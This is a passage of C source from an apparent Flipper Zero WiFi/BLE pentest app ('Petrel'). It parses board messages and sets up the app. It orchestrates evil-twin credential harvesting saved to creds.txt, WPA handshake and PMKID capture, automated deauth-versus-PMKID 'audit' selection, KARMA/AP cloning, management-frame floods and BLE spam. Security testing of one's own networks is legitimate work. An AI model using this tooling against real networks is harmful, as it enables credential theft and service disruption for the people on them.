        if(!token) return;
        strncpy(newAP->APssid, token, sizeof(newAP->APssid) - 1);
        newAP->APssid[sizeof(newAP->APssid) - 1] = '\0';

        token = petrel_strtok(NULL, "|", &_sv); // BSSID
        if(!token) return;
        strncpy(newAP->APbssid, token, 17);
        newAP->APbssid[17] = '\0';

        token = petrel_strtok(NULL, "|", &_sv); // Canal
        if(!token) return;
        newAP->chanel = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // security
        if(!token) return;
        newAP->security = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // RSSI
        if(!token) return;
        newAP->rssi = atoi(token);

        newAP->deauth = false;

        app->wifiCount++;
    } else if(strncmp(furi_string_get_cstr(line), "SCAN:OK", 7) == 0) {
        scanFinish = true;
        FURI_LOG_D(TAG, "SCAN FINISH");
    } else if(strncmp(furi_string_get_cstr(line), "SCAN:FAIL", 9) == 0) {
        scanFailed = true;
        FURI_LOG_D(TAG, "SCAN FAILED (board)");
    } else if(strncmp(furi_string_get_cstr(line), "EV:", 3) == 0) {
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';
        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":|", &_sv); // Omitir "EV:"
        if(!token) return;
        token = petrel_strtok(NULL, "|", &_sv);
        if(!token) return;
        if(strlen(credentials) + strlen(token) + 2 < sizeof(credentials)) {
            petrel_strcat(credentials, token);
            petrel_strcat(credentials, "\n");
        }
        creds_append_sd(token);   // also persist to /ext/petrel/creds.txt
        post_event(app, PETREL_EVT_CREDS);
    } else if(strncmp(furi_string_get_cstr(line), "ERROR:", 6) == 0) {
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';
        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":", &_sv);
        if(!token) return;
        token = petrel_strtok(NULL, "|", &_sv);
        if(!token) return;

        if(batch_active) {
            // E3: a rejected HSGRAB (unreachable/unparseable target) must not abort the queue -
            // record the miss and move straight on to the next AP.
            batch_note(0);
            batch_seq++;
            batch_step(app);
        } else {
            snprintf(message, sizeof(message), "%s", token);
            snprintf(popupHeader, sizeof(popupHeader), "ERROR");
            post_event(app, PETREL_EVT_POPUP);
        }
    } else if(strncmp(furi_string_get_cstr(line), "HSCAP:", 6) == 0) {
        // Board header before a HSFRAME dump: "HSCAP: ch=N count=N".
        hs_count = 0;
        const char* s = strstr(furi_string_get_cstr(line), "ch=");
        hs_channel = s ? atoi(s + 3) : 0;
    } else if(strncmp(furi_string_get_cstr(line), "HSFRAME:", 8) == 0) {
        const char* hex = furi_string_get_cstr(line) + 8;
        if(hs_count < HS_MAX_FRAMES) {
            uint16_t n = 0;
            const char* p = hex;
            bool clean = true;
            for(; p[0] && n < HS_FRAME_MAX; p += 2) {
                int hi = hs_hexval(p[0]);
                int lo = p[1] ? hs_hexval(p[1]) : -1;   // odd trailing nibble -> not clean
                if(hi < 0 || lo < 0) { clean = false; break; }
                hs_frames[hs_count][n++] = (uint8_t)((hi << 4) | lo);
            }
            if(*p) clean = false;   // leftover hex (invalid byte, or frame exceeds HS_FRAME_MAX)
            // Keep only a line that decoded IN FULL. A garbled/truncated line is dropped rather than
            // stored as a corrupt prefix that would fail validation AND consume one of 16 slots.
            if(clean && n > 0) {
                hs_lens[hs_count] = n;
                hs_count++;
            }
        }
    } else if(
        strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0 ||
        strncmp(furi_string_get_cstr(line), "BTMSTAS:", 8) == 0 ||
        strncmp(furi_string_get_cstr(line), "AUTHFLOOD:", 10) == 0 ||
        strncmp(furi_string_get_cstr(line), "ASSOCFLOOD:", 11) == 0 ||
        strncmp(furi_string_get_cstr(line), "SAEFLOOD:", 9) == 0) {
        // The board confirms a management-action burst. Only the unicast (second) pass is
        // watched: BTM/CSA always print their own line first, and two popups would stack.
        snprintf(message, sizeof(message), "%s", furi_string_get_cstr(line));
        snprintf(popupHeader, sizeof(popupHeader), "Sent");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "HSDONE:", 7) == 0) {
        uint16_t written = 0;
        if(batch_active) {
            // E3: this AP is finished - give it its own pcap and arm the next one. No popup: the
            // busy screen stays up and doubles as the progress display.
            char path[128];
            snprintf(
                path,
                sizeof(path),
                "/ext/petrel/sessions/%s/batch_%u.pcap",
                petrel_session_id,
                (unsigned)(batch_seq + 1));
            hs_write_pcap(path, &written, NULL);
            if(written) batch_good++;
            batch_note((int)written);
            batch_seq++;
            batch_step(app);
        } else {
            char qual[48], hist[72];
            bool saved = false;
            char hp[160];
            if(audit_mode) {
                // Audit evidence -> the run's session dir (unique, not the overwritten root
                // /ext/petrel/hs.pcap), written synchronously so `saved` is the real outcome.
                petrel_artifact_path(hp, sizeof(hp), "hs.pcap");
                hs_write_pcap(hp, &written, &saved);
            } else {
                snprintf(hp, sizeof(hp), "/ext/petrel/hs.pcap");
                hs_write_pcap(hp, &written, NULL);
            }
            bool complete = hs_quality(qual, sizeof(qual), hist, sizeof(hist));
            if(audit_mode)
                audit_write_json("handshake", (int)written, complete, saved, qual, hist);
            snprintf(
                message,
                sizeof(message),
                "%u EAPOL: %s\nch %d -> %s%s",
                (unsigned)written,
                qual,
                hs_channel,
                audit_mode ? "session dir" : "/ext/petrel/hs.pcap",
                (audit_mode && !saved) ? " (NOT saved!)" : "");
            snprintf(popupHeader, sizeof(popupHeader), "Capture done");
            post_event(app, PETREL_EVT_POPUP);
        }
    } else if(strncmp(furi_string_get_cstr(line), "PMFDONE:", 8) == 0) {
        if(audit_mode && audit_phase == AUDIT_PHASE_PMF) {
            // Guided audit, PMF scan done. Decide whether the AP is PMF-required (from its PMF: line,
            // else the coarse security bits). Required -> deauth is useless -> PMKID now, no need to
            // enumerate stations. Deauthable -> run STASCAN and decide handshake-vs-PMKID on STADONE.
            audit_phase = AUDIT_PHASE_NONE;
            if(!busy_active) { audit_mode = false; return; }   // user left during the scan
            bool pmf_required = audit_pmf_seen ?
                                    audit_pmf_req :
                                    ((audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED));
            if(pmf_required) {
                audit_send_grab(app, AUDIT_METHOD_PMKID);
            } else {
                char cmd[48];
                snprintf(cmd, sizeof(cmd), "STASCAN %d %s 8\n", audit_ch, audit_hex);
                uart_helper_send(app->uart_helper, cmd, strlen(cmd));
                audit_phase = AUDIT_PHASE_STA;
                busy_total_s = 8;
                busy_ticks = 0;   // re-arm the per-phase watchdog for the STA scan
                snprintf(popupHeader, sizeof(popupHeader), "Audit: stations");
                snprintf(message, sizeof(message), "STA scan ch %d...", audit_ch);
            }
            return;
        }
        if(!busy_active) return;   // stale/cancelled scan reply: don't yank the UI to recon
        snprintf(recon_title, sizeof(recon_title), "PMF / WPA3");
        const char* s = strstr(furi_string_get_cstr(line), "aps=");
        sess_pmf = s ? atoi(s + 4) : 0;
        petrel_save_scan("pmf", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PMF:", 4) == 0) {
        // A6: classify "<mac>|<ssid>|akm=N|sae=N|mfp=cap|req" into a WPA3/WPA2 verdict so the
        // recon view reads like an inventory (and transition-mode downgrades stand out).
        const char* s = furi_string_get_cstr(line) + 4;
        // Metadata starts after the SSID field: an SSID containing "mfp=req" must not override the
        // real value, so search only past the second '|'.
        const char* meta = s;
        for(int f = 0; f < 2 && meta; f++) {
            meta = strchr(meta, '|');
            if(meta) meta++;
        }
        if(!meta) meta = s + strlen(s);
        if(audit_mode && audit_phase == AUDIT_PHASE_PMF) {
            // Audit PMF scan: capture only the target AP's PMF posture; skip recon_append so the
            // other on-channel APs don't pollute recon_text (a cancelled fall-through shows it).
            if(audit_bssid_valid && pmf_line_is_target(s)) {
                audit_pmf_seen = true;
                const char* m = strstr(meta, "mfp=");
                audit_pmf_req = m && !strncmp(m + 4, "req", 3);
            }
            return;
        }
        const char* sae = strstr(meta, "sae=");
        const char* mfp = strstr(meta, "mfp=");
        int sae_v = sae ? atoi(sae + 4) : 0;
        const char* cls;
        if(sae_v && mfp && !strncmp(mfp + 4, "req", 3)) {
            cls = "WPA3-only";
        } else if(sae_v) {
            cls = "WPA3(PMFcap)";
        } else if(mfp && !strncmp(mfp + 4, "cap", 3)) {
            cls = "WPA2+PMFcap";
        } else {
            cls = "WPA2";
        }
        char out[96];
        snprintf(out, sizeof(out), "%.60s %s", s, cls);
        recon_append(out);
    } else if(strncmp(furi_string_get_cstr(line), "STADONE:", 8) == 0) {
        if(audit_mode && audit_phase == AUDIT_PHASE_STA) {
            // Guided audit, station scan done (only reached for a deauthable AP). Stations present ->
            // deauth-assisted handshake; none -> clientless PMKID. audit_pick_method is the single
            // source of truth (here pmf_required is false, so it reduces to the station test).
            audit_phase = AUDIT_PHASE_NONE;
            if(!busy_active) { audit_mode = false; return; }   // user left during the scan
            const char* s = strstr(furi_string_get_cstr(line), "n=");
            audit_stas = s ? atoi(s + 2) : 0;
            AuditMethod m = audit_pick_method(
                audit_pmf_seen,
                audit_pmf_req,
                (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED),
                audit_stas);
            audit_send_grab(app, m);
            return;
        }
        if(!busy_active) return;   // stale/cancelled scan reply: don't yank the UI to recon
        snprintf(recon_title, sizeof(recon_title), "Stations");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_stas = s ? atoi(s + 2) : 0;
        petrel_save_scan("stations", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "STA:", 4) == 0) {
        recon_append(furi_string_get_cstr(line) + 4);
    } else if(strncmp(furi_string_get_cstr(line), "DEAUTHDONE:", 11) == 0) {
        snprintf(recon_title, sizeof(recon_title), "Deauth IDS");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_deauth = s ? atoi(s + 2) : 0;
        petrel_save_scan("deauth_ids", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "DEAUTH:", 7) == 0) {
        recon_append(furi_string_get_cstr(line) + 7);
    } else if(strncmp(furi_string_get_cstr(line), "CLIDONE:", 8) == 0) {
        // A2: the board finished the tracker window - keep the timeline in the session folder.
        snprintf(recon_title, sizeof(recon_title), "Client tracker");
        petrel_save_scan("clients", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "CLI:", 4) == 0) {
        recon_append(furi_string_get_cstr(line) + 4);
    } else if(strncmp(furi_string_get_cstr(line), "PROBEDONE:", 10) == 0) {
        snprintf(recon_title, sizeof(recon_title), "Probe / PNL");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_probes += s ? atoi(s + 2) : 0;
        petrel_save_scan("probe", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PROBE:", 6) == 0) {
        recon_append(furi_string_get_cstr(line) + 6);
    } else if(strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0) {
        // B2b: per-station unicast announcements
        snprintf(popupHeader, sizeof(popupHeader), "CSA unicast");
        snprintf(message, sizeof(message), "Sent to %s stations", furi_string_get_cstr(line) + 8);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "CSA:", 4) == 0) {
        // B2: what the board actually sent
        snprintf(popupHeader, sizeof(popupHeader), "CSA");
        snprintf(message, sizeof(message), "Sent %s", furi_string_get_cstr(line) + 4);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "APCLONE:", 8) == 0) {
        snprintf(message, sizeof(message), "Cloned %s", furi_string_get_cstr(line) + 8);
        snprintf(popupHeader, sizeof(popupHeader), "AP clone");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "PROBEFLOOD:", 11) == 0) {
        snprintf(message, sizeof(message), "Sent %s probes", furi_string_get_cstr(line) + 11);
        snprintf(popupHeader, sizeof(popupHeader), "Probe flood");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "RECDONE:", 8) == 0) {
        // F5: the board finished dumping the recording - save it as a runnable script.
        rec_save(app);
    } else if(strncmp(furi_string_get_cstr(line), "REC:", 4) == 0) {
        if(rec_script_n < REC_SCRIPT_MAX) {
            snprintf(rec_script[rec_script_n], sizeof(rec_script[0]), "%s", furi_string_get_cstr(line) + 4);
            rec_script_n++;
        }
    } else if(strncmp(furi_string_get_cstr(line), "RECCTL:", 7) == 0 ||
              strncmp(furi_string_get_cstr(line), "RECN:", 5) == 0) {
        // F5: recorder acks / live count - nothing to do until the list is fetched
    } else if(strncmp(furi_string_get_cstr(line), "KARMALIST:", 10) == 0) {
        // B1: "<n>|ssid|ssid|..." - the KARMA scene renders this live, and the list is persisted
        // to the run's session folder (once per change, not once per poll).
        snprintf(karma_list, sizeof(karma_list), "%s", furi_string_get_cstr(line) + 10);
        if(strcmp(karma_list, karma_saved) != 0) {
            snprintf(karma_saved, sizeof(karma_saved), "%s", karma_list);
            char body[192];
            int o = 0;
            const char* q = strchr(karma_list, '|');
            while(q && o < 150) {
                const char* e = strchr(q + 1, '|');
                int l = e ? (int)(e - q - 1) : (int)strlen(q + 1);
                if(l > 0) o += snprintf(body + o, sizeof(body) - (size_t)o, "%.*s\n", l, q + 1);
                q = e;
            }
            petrel_save_scan("karma", o > 0 ? body : "(none)\n");
        }
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "KARMA:", 6) == 0) {
        // on/off ack - the scene shows live state from the KARMALIST polls instead
    } else if(strncmp(furi_string_get_cstr(line), "TRAPSTAT:", 9) == 0) {
        // C1: "on ch=6 ap=<ssid> seen=N" - keep the Trap screen honest even if the one-shot
        // TRAP event was missed (e.g. the app entered the screen after the AP was already up).
        const char* ap = strstr(furi_string_get_cstr(line), "ap=");
        if(ap) {
            ap += 3;
            if(*ap == '-') {
                trap_state[0] = '\0';
            } else {
                const char* sp = strchr(ap, ' ');
                int l = sp ? (int)(sp - ap) : (int)strlen(ap);
                if(l > 0 && l < (int)sizeof(trap_state)) {
                    snprintf(trap_state, sizeof(trap_state), "%.*s", l, ap);
                }
            }
            post_event(app, PETREL_EVT_KARMA);
        }
    } else if(strncmp(furi_string_get_cstr(line), "TRAPCTL:", 8) == 0) {
        // C1: Trap on/off ack
    } else if(strncmp(furi_string_get_cstr(line), "TRAP:", 5) == 0) {
        // C1: the board cloned a network for real - show which one on the Trap screen and record
        // it (with the portal that was armed) in the run's session folder.
        snprintf(trap_state, sizeof(trap_state), "%s", furi_string_get_cstr(line) + 5);
        {
            char body[96];
            snprintf(
                body,
                sizeof(body),
                "cloned AP: %s\nportal: %s\n",
                trap_state,
                captive_portals[app->captivePortal]);
            petrel_save_scan("trap", body);
        }
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "TRAPFAIL", 8) == 0) {
        snprintf(trap_state, sizeof(trap_state), "(clone failed - still KARMA)");
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "PORTALHASH:", 11) == 0) {
        // Reply to our PORTALHASH request: len + FNV-1a of what the board actually holds.
        // (Parsed with strtol — sscanf is not in the firmware export table.)
        const char* s = furi_string_get_cstr(line) + 11;
        char* endp = NULL;
        unsigned len = (unsigned)strtol(s, &endp, 10);
        unsigned long h = (endp && *endp == ':') ? (unsigned long)strtol(endp + 1, NULL, 16) : 0;
        bool ok = (len == (unsigned)portal_exp_len) && (h == (unsigned long)portal_exp_hash);
        snprintf(popupHeader, sizeof(popupHeader), ok ? "Portal OK" : "Portal MISMATCH");
        snprintf(message, sizeof(message), "SD %u / board %u B", (unsigned)portal_exp_len, len);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "PMKIDDONE:", 10) == 0) {
        if(audit_mode) {
            // wpa_lines holds only validated, target-bound PMKID records (pmkid_line_valid). Write
            // them synchronously so the audit states whether the hashes actually reached the card.
            bool got = wpa_lines[0] != '\0';
            bool saved = got ? write_wpa_file(true) : false;
            audit_write_json("pmkid", 0, got, saved, got ? "PMKID" : "no PMKID", "");
        } else {
            write_wpa_file(false);
        }
        snprintf(recon_title, sizeof(recon_title), "PMKID");
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PMKID:", 6) == 0 ||
              strncmp(furi_string_get_cstr(line), "WPA*01*", 7) == 0) {
        const char* s = furi_string_get_cstr(line);
        recon_append(s);
        if(pmkid_line_valid(s) &&   // only store a well-formed, non-degenerate PMKID
           strlen(wpa_lines) + strlen(s) + 2 < sizeof(wpa_lines)) {
            petrel_strcat(wpa_lines, s);
            petrel_strcat(wpa_lines, "\n");
        }
    } else if(strncmp(furi_string_get_cstr(line), "IDENT:", 6) == 0) {
        // A: board capability/version advertisement (HELLO response).
        const char* s = furi_string_get_cstr(line);
        const char* fw = strstr(s, "fw=");
        if(fw) {
            const char* e = strchr(fw + 3, ';');
            size_t n = e ? (size_t)(e - (fw + 3)) : strlen(fw + 3);
            if(n >= sizeof(app->fw_version)) n = sizeof(app->fw_version) - 1;
            memcpy(app->fw_version, fw + 3, n);
            app->fw_version[n] = '\0';
        }
        const char* cp = strstr(s, "caps=");
        if(cp) {
            const char* e = strchr(cp + 5, ';');
            size_t n = e ? (size_t)(e - (cp + 5)) : strlen(cp + 5);
            if(n >= sizeof(app->fw_caps)) n = sizeof(app->fw_caps) - 1;
            memcpy(app->fw_caps, cp + 5, n);
            app->fw_caps[n] = '\0';
            diag(20, (uint32_t)n, 0);                    // caps received
            post_event(app, PETREL_EVT_REIDENTIFIED);   // let the current menu rebuild
        }
        FURI_LOG_I(TAG, "IDENT fw=%s caps=%s", app->fw_version, app->fw_caps);
    } else if(strncmp(furi_string_get_cstr(line), "BLEDONE:", 8) == 0) {
        snprintf(recon_title, sizeof(recon_title), "BLE");
        petrel_save_scan("ble", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "BLESPAM:", 8) == 0) {
        // reply is "BLESPAM:off <count>" -> show just the count
        const char* s = furi_string_get_cstr(line) + 8;
        const char* sp = strchr(s, ' ');
        snprintf(message, sizeof(message), "Sent %s payloads", sp ? sp + 1 : s);
        snprintf(popupHeader, sizeof(popupHeader), "BLE spam");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:done", 9) == 0) {
        snprintf(recon_title, sizeof(recon_title), "GATT");
        petrel_save_scan("gatt", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:connect-failed", 19) == 0) {
        snprintf(message, sizeof(message), "Connect failed");
        snprintf(popupHeader, sizeof(popupHeader), "GATT");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:", 5) == 0) {
        recon_append(furi_string_get_cstr(line) + 5);
    } else if(strncmp(furi_string_get_cstr(line), "BLE:", 4) == 0) {
        // BLE:<mac>|<rssi>|<name>|<vendor>|<data> -> remember the device for GATT enumerate
        const char* s = furi_string_get_cstr(line) + 4;
        char mac[18] = "";
        const char* p1 = strchr(s, '|');
        if(p1 && (size_t)(p1 - s) < sizeof(mac)) {
            size_t n = (size_t)(p1 - s);
            memcpy(mac, s, n);
            mac[n] = '\0';
        }
        if(mac[0]) {
            char name[24] = "";
            char tag[16] = "";
            // fields after "BLE:": mac | rssi | name | vendor | raw
            const char* p2 = p1 ? strchr(p1 + 1, '|') : NULL; // end of rssi
            const char* p3 = p2 ? strchr(p2 + 1, '|') : NULL; // end of name
            const char* p4 = p3 ? strchr(p3 + 1, '|') : NULL; // end of vendor
            if(p2 && p3) {
                size_t n = (size_t)(p3 - p2 - 1);
                if(n > 23) n = 23;
                memcpy(name, p2 + 1, n);
                name[n] = '\0';
            }
            if(p3 && p4) {
                size_t n = (size_t)(p4 - p3 - 1);
                if(n > 15) n = 15;
                memcpy(tag, p3 + 1, n);
                tag[n] = '\0';
            }
            if(!name[0]) strncpy(name, "(no name)", sizeof(name) - 1);
            bool have = false;
            for(int i = 0; i < ble_list_n; i++)
                if(!strcmp(ble_list_mac[i], mac)) {
                    have = true;
                    break;
                }
            if(!have && ble_list_n < BLE_LIST_MAX) {
                strncpy(ble_list_mac[ble_list_n], mac, sizeof(ble_list_mac[0]) - 1);
                ble_list_name[ble_list_n][0] = '\0';
                strncpy(ble_list_name[ble_list_n], name, sizeof(ble_list_name[0]) - 1);
                ble_list_tag[ble_list_n][0] = '\0';
                strncpy(ble_list_tag[ble_list_n], tag, sizeof(ble_list_tag[0]) - 1);
                ble_list_n++;
            }
        }
        recon_append(s);
    }
}

static void animation_timer_callback(void* context) {
    Petrel* app = context;
    // Timer thread: post only. The frame is built in beacon_info_scene_on_event's
    // PETREL_EVT_ANIM_TICK case, on the GUI thread.
    post_event(app, PETREL_EVT_ANIM_TICK);
}

static Petrel* app_alloc() {
    FURI_LOG_D(TAG, __func__);
    // First, before anything that can produce an event (the UART worker starts inside
    // uart_helper_alloc below, and the timers are created later): the ring's mutex.
    post_head = 0;
    post_tail = 0;
    post_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(post_mutex);
    diag_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(diag_mutex);
    // Storage worker first, so any line that arrives once the UART worker starts already has
    // somewhere to hand its snapshot.
    storage_head = 0;
    storage_tail = 0;
    storage_dropped = 0;
    storage_status[0] = '\0';
    storage_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(storage_mutex);
    storage_run = true;
    storage_thread = furi_thread_alloc_ex("PetrelStorage", 2048, storage_worker, NULL);
    furi_thread_start(storage_thread);
    Petrel* app = malloc(sizeof(Petrel));
    app->ssidAPLength = 32;
    //app->ssidAPLength = 0;
    app->captivePortal = 0;
    app->deauthReason = 2;
    app->mac_type = 1; // default: random AP MAC
    app->securityAP = 0;
    app->channelAP = 9;
    app->ssidAP = malloc(app->ssidAPLength);
    strcpy(app->ssidAP, "Free_Wifi");
    app->passwordAPLength = 64;
    app->passwordAP = malloc(app->passwordAPLength);
    strcpy(app->passwordAP, "password123");
    app->selectedWifi = 0;
    app->wifiCount = 0;
    app->menuIndex = 0;
    app->submenuIndex = 0;
    // rickIndex drives rick[rickIndex] from the animation timer. It used to be first written during
    // teardown only, so a beacon-mode animation started against whatever malloc left in the field -
    // and a negative value stays negative under the timer's % 24 (C truncates toward zero), which is
    // an out-of-bounds icon pointer. Initialise it here.
    app->rickIndex = 0;
    app->fw_version[0] = '\0';
    app->fw_caps[0] = '\0';
    app->ident_attempts = 0;
    app->ident_last_tick = 0;
    app->bleAdvHex[0] = '\0';
    app->ibeaconUuid[0] = '\0';
    app->scene_manager = scene_manager_alloc(&Petrel_scene_manager_handlers, app);
    app->view_dispatcher = view_dispatcher_alloc();
    // Default AP MAC = random (locally administered)
    {
        unsigned char random_mac[6];
        generate_mac_address(random_mac);
        snprintf(
            app->customMac,
            sizeof(app->customMac),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            random_mac[0],
            random_mac[1],
            random_mac[2],
            random_mac[3],
            random_mac[4],
            random_mac[5]);
    }
    parse_mac(app->customMac, app->byte_input_store);

    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, Petrel_custom_callback);
    view_dispatcher_set_navigation_event_callback(
        app->view_dispatcher, Petrel_back_event_callback);

    app->menu = menu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, mainMenuView, menu_get_view(app->menu));

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, scannedWifisView, submenu_get_view(app->submenu));
    view_dispatcher_add_view(app->view_dispatcher, beaconListView, submenu_get_view(app->submenu));

    app->text_input = text_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, bssidTextInputView, text_input_get_view(app->text_input));
    view_dispatcher_add_view(
        app->view_dispatcher, apNameTextInputView, text_input_get_view(app->text_input));
    view_dispatcher_add_view(
        app->view_dispatcher, apPasswordTextInputView, text_input_get_view(app->text_input));

    app->loading = loading_alloc();
    view_dispatcher_add_view(app->view_dispatcher, loadingView, loading_get_view(app->loading));

    app->widget = widget_alloc();
    // The widget view is registered for several scenes (wifiInfo/evilCreds/beaconInfo/...) and
    // now also receives input (C1 portal picker). Without a context those callbacks get NULL as
    // their context and dereferencing it hard-crashes the Flipper - which is exactly what
    // happened the first time LEFT/RIGHT was pressed on the Trap screen.
    // Do NOT point the widget's view context at the app. widget_alloc() already set it to the
    // Widget* and the widget's own input handler casts it back to Widget* to reach widget->view.
    // Pointing it at app made that read app->scene_manager as a View*, so any key delivered to the
    // widget faulted the device - before the button callback ran. Drawing was unaffected (the draw
    // callback gets the model), which is why the AP info screen rendered perfectly and then reset
    // the Flipper a moment later, when the rest of the OK press (short/release) was routed to it.
    view_set_context(widget_get_view(app->widget), app->widget);
    // NOTE: do NOT view_set_input_callback() on the widget view here. That replaces the widget's
    // own button handling for every screen that shares this view - which silently broke the AP
    // info screen's Edit/Deauth/Evil buttons, and Edit is how the Tools menu is reached.
    // The KARMA/Trap controls are widget buttons instead (see karma_button_cb).
    view_dispatcher_add_view(app->view_dispatcher, wifiInfoView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, evilCredsView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, beaconInfoView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, helpView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, pmfView, widget_get_view(app->widget));
    view_dispatcher_add_view(
        app->view_dispatcher, toolsListView, submenu_get_view(app->submenu));

    app->variableList = variable_item_list_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, configAttackView, variable_item_list_get_view(app->variableList));
    view_dispatcher_add_view(
        app->view_dispatcher, configAPView, variable_item_list_get_view(app->variableList));
    view_dispatcher_add_view(
        app->view_dispatcher, settingsView, variable_item_list_get_view(app->variableList));

    app->byteInput = byte_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, aPmacAddresView, byte_input_get_view(app->byteInput));

    // The popup scene draws with the widget (see popup_scene_on_enter), so this slot points at
    // the widget's view. widget_alloc() already set its context to the Widget, and the popup
    // scene must not override it (that mistake cost us the AP info screen for three sessions).
    view_dispatcher_add_view(app->view_dispatcher, popupView, widget_get_view(app->widget));

    // Card-grid main menu
    app->cardView = view_alloc();
    view_allocate_model(app->cardView, ViewModelTypeLockFree, 1); // enable view_commit_model refresh
    view_set_context(app->cardView, app);
    view_set_draw_callback(app->cardView, card_menu_draw);
    view_set_input_callback(app->cardView, card_menu_input);
    view_dispatcher_add_view(app->view_dispatcher, cardMenuView, app->cardView);

    app->chanMapView = view_alloc();
    view_allocate_model(app->chanMapView, ViewModelTypeLocking, sizeof(ChanModel));
    view_set_context(app->chanMapView, app);
    view_set_draw_callback(app->chanMapView, channel_map_draw);
    view_set_input_callback(app->chanMapView, channel_map_input);
    view_dispatcher_add_view(app->view_dispatcher, channelMapView, app->chanMapView);

    // Animated "working" screen (operation name + spinner)
    app->busyView = view_alloc();
    view_allocate_model(app->busyView, ViewModelTypeLockFree, sizeof(BusyModel));
    view_set_context(app->busyView, app);
    view_set_draw_callback(app->busyView, busy_view_draw);
    view_dispatcher_add_view(app->view_dispatcher, busyView, app->busyView);
    app->busyTimer = furi_timer_alloc(busy_timer_cb, FuriTimerTypePeriodic, app);
    app->karmaTimer = furi_timer_alloc(karma_timer_cb, FuriTimerTypePeriodic, app);
    app->scriptTimer = furi_timer_alloc(script_timer_cb, FuriTimerTypePeriodic, app);

    app->uart_lines = furi_message_queue_alloc(64, sizeof(FuriString*));
    furi_check(app->uart_lines);
    app->scan_waiting = false;
    app->scan_deadline = 0;
    // 10 ms, not 1 ms: this callback runs on the dispatcher (GUI) thread, and there is no reason to
    // spend that thread a thousand times a second polling a message queue. Eight lines per tick
    // still keeps up with ~800 lines/s. (An earlier version of this comment blamed the 1 ms tick
    // for dropped key presses. That was wrong: the "drops" were stale screenshot frames - the
    // Flipper only streams a frame when the screen changes. See tools/flip_see.py.)
    view_dispatcher_set_tick_event_callback(
        app->view_dispatcher, uart_gui_tick, furi_ms_to_ticks(10));

    app->uart_helper = uart_helper_alloc();
    uart_helper_set_baud_rate(app->uart_helper, DEVICE_BAUDRATE);
    uart_helper_set_delimiter(app->uart_helper, LINE_DELIMITER, INCLUDE_LINE_DELIMITER);
    // Frame callback first: set_callback() is what starts the worker and RX, so installing it
    // afterwards left a window where binary frames were dropped.
    uart_helper_set_frame_callback(app->uart_helper, petrel_scan_frame); // M0.3: DP_SCAN_AP side-channel
    uart_helper_set_callback(app->uart_helper, uart_enqueue_line, app);
    petrel_ident(app); // A: ask the board to advertise caps (bounded, see petrel_ident)

    app->timer = furi_timer_alloc(animation_timer_callback, FuriTimerTypePeriodic, app);
    return app;
}

void Petrel_wifimenu_callback(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
    UNUSED(index);
}

static void app_free(Petrel* app) {
    FURI_LOG_D(TAG, __func__);
    furi_assert(app);

    furi_timer_stop(app->timer);
    furi_timer_stop(app->busyTimer);
    furi_timer_stop(app->karmaTimer);
    furi_timer_stop(app->scriptTimer);
    furi_timer_free(app->timer);
    furi_timer_free(app->busyTimer);
    furi_timer_free(app->karmaTimer);
    furi_timer_free(app->scriptTimer);
